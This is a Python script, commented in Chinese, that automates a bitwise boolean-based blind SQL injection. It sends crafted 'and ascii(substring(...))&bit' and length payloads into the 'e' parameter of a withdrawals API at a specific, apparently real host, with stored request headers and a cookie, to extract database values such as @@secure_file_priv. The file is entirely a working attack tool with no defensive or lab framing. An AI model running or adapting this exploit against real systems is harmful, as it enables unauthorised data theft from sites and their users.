import string
import requests as rq
from urllib.parse import quote,unquote

string_sql = "select @@secure_file_priv"     # 要提取的一个变量或一个字符串
raw_sql = "2022-04-30') and ascii(substring((%s), %s, 1))&%s -- " # 提取字符的 payload
length_sql = "2022-04-30') and length((%s))&%s -- "    # 提取字符串长度的 payload
url = "https://dkmwa.abert514aebf156rae15b6f.com/api/pc/usercentre/withdrawals" # 目标URL
query_string = "s=1&e=2022-04-30"   # 查询字符串
target_param = "e"                  # 有注入点的参数
true_flag = "W220327142633265"      # 布尔特征
post_body = ""                      # post请求体
http_file = "./http.txt"      # 所有的http请求头部
"""
http.txt 的文件内容：
Host: dkmwa.abert514aebf156rae15b6f.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json; charset=UTF-8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://dkmwa.abert514aebf156rae15b6f.com/
x-lang: zh-CN
Connection: close
Cookie: __zlcmid=19Vkqvxb08IWCjp
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
"""


def get_length():
    """获取要提取的变量或字符串的长度"""
    and_bytes = ['1', '2', '4', '8', '16', '32', '64', '128', '256']
    payloads = [length_sql % (string_sql, and_byte) for and_byte in and_bytes]
    length = get_num(payloads)
    return length
    

def get_payloads(length):
    '''获取检索一个字符的所有payload'''
    and_bytes = ['1','2','4','8','16','32','64','128']
    payloads = [raw_sql % (string_sql, str(length), and_byte) for and_byte in and_bytes]
    return payloads


def get_num(payloads):
    '''获取一个字符的ascii或者要提取的字符串的长度'''
    headers_string = open(http_file, 'r')
    headers = {}
    for line in headers_string:
        key, value = line.strip().split(": ")
        headers[key] = value
    
    params = {}
    for s in query_string.split('&'):
        key, value = s.split("=")
        params[key] = value
    
    byte_length = len(payloads)
    byte = [0] * byte_length
    for i in range(byte_length):
        params[target_param] = payloads[i]
        res = rq.get(url, params=params, headers=headers)
        byte[i] = 1 if true_flag in res.text else 0
    
    o = 0
    for i in range(byte_length):
        o = (o + 2 ** i) if byte[i] == 1 else o
            
    return o
        

def main():

    length = get_length()
    print("sql:", string_sql)
    print("value length:", length)
    s = ''
    for i in range(1, length+1):
        payloads = get_payloads(i)
        s = s + chr(get_num(payloads))
    print("value:", s)
    

main()
